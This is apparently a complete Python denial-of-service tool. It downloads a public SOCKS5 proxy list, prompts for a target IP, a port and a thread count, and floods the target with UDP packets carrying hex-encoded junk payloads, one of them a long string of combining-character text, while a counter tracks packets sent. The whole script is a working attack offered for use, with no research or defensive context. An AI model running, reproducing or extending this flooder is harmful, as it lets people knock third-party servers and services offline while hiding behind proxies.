import socket
import struct
import codecs, sys
import threading
import random
import time
import os

try:
	import socks
	import wget
	from colorama import init
	from colorama import Fore, Back, Style
except:
	print(Fore.RED + "[Modules] Error from import!")
	print(Fore.RED + "[Modules] Enter: pip install requirements.txt")
	
sent = 0
errors = 0

try:
	message1 = codecs.decode("081e77da","hex_codec")
	message2 = codecs.decode("081e7eda","hex_codec")
	message3 = codecs.decode("081e77da","hex_codec")
	message4 = codecs.decode("cdaccdaccda4cdaccda6e1bb8ecd96cd88cc9ecca9cd8eccbbccabccabcc9ccd89cca0ccabcd95ccadccadccabccabccb9cc97ccb9cd88ccbccca0cc96cd8dcd9acca5cd88ccaeccbccd95cca0cca4ccafccbbcca5ccaccc97ccbcccb3cca4ccb3ccacccaaccb9cd9acc9eccbccca0cd95ccbccca0cca6cd9accabcd94ccafccb9cd89cd89cc98cd8ecd95ccbccca3cc9dcd99ccb1cc9fccb9cca9cc9fccb3cca6ccadcd89ccaecc96ccadcca3cca3cc9ecc99cc97cc9cccbaccadccbbcca5cd9acd99cc9dcca6ccb2ccb1cd89cd96cd89ccb0cca6cd8eccabcca3ccbccd8ecd8dcca0ccaecd93ccb9ccb9cd89cca4ccb0cc97cc99cd95cd87cd94ccb1cd95ccadcd88ccb3cc97ccadcd94cc98cc96ccbaccaecc9ccca0cd96cc98cd93ccb3cd95cc9fcca0ccb1ccabcca4cd93cd94cc98ccb0ccb2cd99cd8dcd87cc99cd8ecca3ccbccc97cc96cd99ccafcd89cca0cc9fcd88cd8dcd95ccaacd93cc9dcca9cca620cca4cd87ccaccca0ccb3ccadcc9eccbaccb2ccb32acd86cd92cc86cdaacd9bcdadcd90cc91cc88cc81cc91cc86cc86cc8ecc8acc81cc9acc9acd9f20cca8cca6cd89cd8951cca4cd87ccaccca0ccb3ccadcc9eccbaccb2ccb32acd86cd92cc86cdaacd9bcdadcd90cc91cc88cc81cc91cc86cc86cc8ecc8acc81cc9acc9acd9f20cca8cca6cd89cd89ccafccb2cd94ccb1cca0cc96cd99cc97ccbbccb1ccb2ccb9ccb9cd93cd99cd9d2acc9bcc80cc8cccbfcdaccda5cd90cd82cda120cc9dcc9fcd8dcca0cd8ecc9ccc96ccb9cd96cca3cd8dcd95cc96cc9fcc9dcd87cc9dcc9fcca62acda6cda7cda4cda9cda6cc83cc80cc8ccdaacc8620cc8acdaacdaccdabcc8bcd8fcc9bcd99cca4cd9acc9ccca4ccbacda0cd8520e0b894e0b989e0b987e0b987e0b987e0b987e0b987e0b989e0b987e0b987e0b987e0b987e0b987e0b989e0b987e0b987e0b987e0b987e0b987e0b989e0b987e0b987e0b987e0b987e0b987e0b989e0b987e0b987e0b987e0b987e0b987e0b989e0b987e0b987e0b987e0b987e0b987e0b989e0b987e0b987e0b987e0b987e0b987e0b88fe0b98ee0b98ee0b98ee0b98ee0b98ee0b98ee0b98ee0b98ee0b98ee0b98ee0b98ee0b98ee0b98ee0b98ee0b98ee0b98ee0b98ee0b98ee0b98ee0b98ee0b98ee0b98ee0b98ee0b98ee0b98ee0b98ee0b98ee0b98ee0b98ee0b98ee0b98ee0b98ee0b98ee0b98ee0b98ee0b98ee0b98ee0b98ee0b98ee0b98ee0b98ee0b98ee0b98ee0b98ee0b98ee0b98ee0b98ee0b98ee0b98ee0b98ee0b98ee0b98ee0b98ee0b98ee0b98ee0b98ee0b98ee0b98ee0b98ee0b98ee0b98ee0b98ee0b98ee0b98ee0b98ee0b98ee0b98ee0b98ee0b98ee0b98ee0b98ee0b98ee0b98ee0b98ee0b98ee0b98ee0b98ee0b98ee0b98ee0b98ee0b98ee0b98ee0b98ee0b98ee0b98ee0b98ee0b98ee0b98de0b98de0b98de0b98de0b98de0b98de0b98de0b98de0b98de0b98de0b98de0b98de0b98de0b98de0b98de0b98de0b98de0b98de0b98de0b98de0b98de0b98de0b98de0b98de0b98de0b98d20e1bb8ecd96cd88cc9ecca9cd8eccbbccabccabcc9ccd89cca0ccabcd95ccadccadccabccabccb9cc97ccb9cd88ccbccca0cc96cd8dcd9acca5cd88ccaeccbccd95cca0cca4ccafccbbcca5ccaccc97ccbcccb3cca4ccb3ccacccaaccb9cd9acc9eccbccca0cd95ccbccca0cca6cd9accabcd94ccafccb9cd89cd89cc98cd8ecd95ccbccca3cc9dcd99ccb1cc9fccb9cca9cc9fccb3cca6ccadcd89ccaecc96ccadcca3cca3cc9ecc99cc97cc9cccbaccadccbbcca5cd9acd99cc9dcca6ccb2ccb1cd89cd96cd89ccb0cca6cd8eccabcca3ccbccd8ecd8dcca0ccaecd93ccb9ccb9cd89cca4ccb0cc97cc99cd95cd87cd94ccb120cdaccdaccda4cdaccda6e1bb8ecd96cd88cc9ecca9cd8eccbbccabccabcc9ccd89cca0ccabcd95ccadccadccabccabccb9cc97ccb9cd88ccbccca0cc96cd8dcd9acca5cd88ccaeccbccd95cca0cca4ccafccbbcca5ccaccc97ccbcccb3cca4ccb3ccacccaaccb9cd9acc9eccbccca0cd95ccbccca0cca6cd9accabcd94ccafccb9cd89","hex_codec")
except:
	print(Fore.RED + "[Decoder] Error!")

messages = [message1, message2, message3, message4]

init()

use_proxy = str(input(Fore.CYAN + "Use Deafault proxy list or custom? (d/c) "))

# fucking python

if use_proxy == "d":
	try:
		os.remove("socks5.txt")
	except:
		pass

	try:	
		proxy5_download = wget.download("https://raw.githubusercontent.com/DevClancy/proxy/main/socks5.txt")
	except:
		print(Fore.RED + "[Proxy] Error!")  

	proxy5_list = open("socks5.txt")
	proxy5_line = proxy5_list.readlines()
	
	if os.name == "nt":
		os.system("cls")
	else:
		os.system("clear")

if use_proxy == "D":
	try:
		os.remove("socks5.txt")
	except:
		pass

	try:	
		proxy5_download = wget.download("https://raw.githubusercontent.com/DevClancy/proxy/main/socks5.txt")
	except:
		print(Fore.RED + "[Proxy] Error!")  

	proxy5_list = open("socks5.txt")
	proxy5_line = proxy5_list.readlines()
	
	if os.name == "nt":
		os.system("cls")
	else:
		os.system("clear")		
		
if use_proxy == "c":
	proxy_custom = str(input(Fore.CYAN + "Enter proxy list (SOCKS5): "))

if use_proxy == "C":
	proxy_custom = str(input(Fore.CYAN + "Enter proxy list (SOCKS5): "))	
	
check_file = os.path.exists("version.txt")

if check_file == True:
	pass
if check_file == False:
	print(Fore.RED + "\n\n[File] Version.txt not found!")

ip = input(Fore.CYAN + "\nEnter IP: ")
port = input(Fore.CYAN + "Enter PORT: ")
threads = int(input(Fore.CYAN + "Enter THREADS: "))

def timeout():
	time.sleep(1)

def info_print(sent, errors):
	if os.name == "nt":
		os.system("cls")
		print(Fore.GREEN + "Sent: " + str(sent) + " " + Fore.RED + "Errors: " + str(errors))
	else:
		os.system("clean")
		print(Fore.GREEN + "Sent: " + str(sent) + " " + Fore.RED + "Errors: " + str(errors))

def cleaner():
	if os.name == "nt":
		os.system("cls")
	else:
		os.system("clear")
		
def attack():
	global sent
	global errors
	with open(r"socks5.txt", "r") as file:
		for line in file:
			try:
				message = random.choice(messages)
				
				sock = socks.socksocket(socket.AF_INET, socket.SOCK_DGRAM)
				list_pr = line.rsplit(':', 1)
				
				ip_pr5 = list_pr[0]
				port_pr5 = int(list_pr[1])
				
				sock.set_proxy(socks.SOCKS5, ip_pr5, port_pr5)
				sock.sendto(message, (ip, int(port)))
				
				sent += 1
				
				cleaner()
				info_print(sent, errors)
			except ConnectionResetError:
				errors += 1
				cleaner()
				info_print(sent, errors)				
				timeout()
			except:
				errors += 1
				cleaner()
				info_print(sent, errors)

if os.name == "nt":
	os.system("cls")
	print(Fore.GREEN + "Sent: " + str(sent) + " " + Fore.RED + "Errors: " + str(errors))
else:
	os.system("clear")
	print(Fore.GREEN + "Sent: " + str(sent) + " " + Fore.RED + "Errors: " + str(errors))
												
for o in range(threads):
	main_thread = threading.Thread(target = attack)
	main_thread.start()
